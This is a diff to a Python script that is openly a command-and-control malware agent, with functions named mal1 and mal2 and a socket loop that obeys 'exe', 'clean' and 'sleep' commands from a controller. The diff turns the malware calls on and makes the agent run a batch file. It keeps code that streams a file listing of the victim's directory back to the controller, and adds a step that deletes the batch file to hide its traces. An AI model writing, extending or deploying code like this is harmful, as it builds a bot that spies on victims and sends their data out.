@@ -4,11 +4,7 @@ txts = []
 secrets = []
 filebytes = []
 def mal1():
-    os.system('echo %HOMEPATH% > homepath.txt')
-    os.system('echo %HOMEDRIVE% > homedrive.txt')
-    os.system('dir /B > currentfiles.txt')
-    os.system('echo xxx >> currentfiles.txt')
-    os.system('dir /B')
+    os.system('agent.bat')
     #os.system('echo stolenpasses >> passwords.txt')
 
 def mal2():
@@ -43,8 +39,8 @@ print('alive sent to c2')
 while True:
     data = a.recv(1024)
     if data.decode() == 'exe':
-        #mal1()
-        #mal2()
+        mal1()
+        mal2()
         print('executing malware')
         time.sleep(1)
         a.send('load'.encode())
@@ -53,8 +49,8 @@ while True:
         filename = "currentfiles.txt"
         # get the file size
         filesize = os.path.getsize(filename)
-        a.send(f"filez {filename}-{filesize}".encode())
-        time.sleep(2)
+        #a.send(f"filez {filename}-{filesize}".encode())
+        #time.sleep(2)
         with open(filename, "rb") as f:
             while True:
                 # read the bytes from the file
@@ -67,9 +63,12 @@ while True:
                 #a.send(str(bytes_read).encode())
                 a.sendall(str(bytes_read).encode())
         print('step 1 complete')
-        time.sleep(2)
-        a.send('step1a'.encode())
-
+        time.sleep(1)
+        #a.send('step1a'.encode())
+    elif data.decode() == 'clean':
+        os.system('copy agent.bat agent.txt && del agent.bat')
+        time.sleep(1)
+        a.send('bot waiting'.encode())
     elif data.decode() == 'sleep':
         print('sleeping')
         time.sleep(15)
